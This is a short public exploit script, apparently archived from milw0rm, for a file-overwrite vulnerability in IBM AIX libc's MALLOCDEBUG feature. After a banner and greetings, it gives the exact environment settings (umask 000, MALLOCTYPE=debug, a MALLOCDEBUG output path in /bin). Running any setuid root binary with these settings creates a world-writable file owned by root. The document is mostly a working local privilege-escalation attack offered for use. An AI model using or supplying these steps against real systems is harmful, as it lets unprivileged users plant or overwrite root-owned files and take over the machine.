#!/bin/bash
#################################################################
#		      _______ _________ _       						#
#		     (  ____ )\__   __/( (    /|						#
#		     | (    )|   ) (   |  \  ( |						#
#		     | (____)|   | |   |   \ | |						#
#		     |     __)   | |   | (\ \) |						#
#		     | (\ (      | |   | | \   |						#
#		     | ) \ \__   | |   | )  \  |						#
#		     |/   \__/   )_(   |/    )_)						#
#                        http://root-the.net 					#
#################################################################
#[+] IBM AIX libc MALLOCDEBUG File Overwrite Vulnerability		#
#[+] Refer : securitytracker.com/id?1022261                     #
#[+] Exploit : Affix <root@root-the.net>						#
#[+] Tested on : IBM AIX										#
#[+] Greetz : Mad-Hatter, Atomiku, RTN, Terogen, SCD, Boxhead,  #
#	      str0ke, tekto, SonicX, Android, tw0, d0nk, Redskull	#
# AIX 5.3 ML 5 is where this bad libc code was added.			#
# Libs Affected :												#
#	/usr/ccs/lib/libc.a											#
#	/usr/ccs/lib/libp/libc.a									#
#################################################################

Set the following environment variables:

umask 000
MALLOCTYPE=debug
MALLOCDEBUG=report_allocations,output:/bin/filename

echo "Now run any setuid root binary.. /bin/filename will be created with 777 permissions."

# milw0rm.com [2009-07-30]